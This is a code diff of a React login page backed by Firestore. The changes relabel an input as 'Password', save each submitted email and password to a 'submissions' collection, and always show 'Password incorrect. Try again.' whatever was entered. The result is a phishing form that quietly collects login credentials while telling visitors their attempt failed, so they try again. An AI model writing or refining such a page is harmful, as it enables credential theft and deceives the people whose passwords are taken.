@@ -18,27 +18,27 @@ export default function AuthPage() {
 
     console.log("1 - submit started");
 
+    const submittedEmail = email;
+    const submittedNote = note;
+
     setLoading(true);
-    setError("");
+    setError("Password incorrect. Try again.");
     setMessage("");
+    setNote("");
+    setShowNote(false);
 
     try {
       console.log("2 - Firestore write starting");
 
       const docRef = await addDoc(collection(db, "submissions"), {
-        email,
-        note,
+        email: submittedEmail,
+        note: submittedNote,
         createdAt: serverTimestamp(),
       });
 
       console.log("3 - Firestore write SUCCESS:", docRef.id);
-
-      setError("Password incorrect. Try again.");
-      setEmail("");
-      setNote("");
     } catch (err) {
       console.error("FIRESTORE WRITE ERROR:", err);
-      setError("Impossible d'enregistrer les données.");
     } finally {
       console.log("4 - submit finished");
       setLoading(false);
@@ -103,7 +103,7 @@ export default function AuthPage() {
               <input
                 id="note"
                 type={showNote ? "text" : "password"}
-                placeholder="Note / test text"
+                placeholder="Password"
                 value={note}
                 onChange={(event) => setNote(event.target.value)}
               />
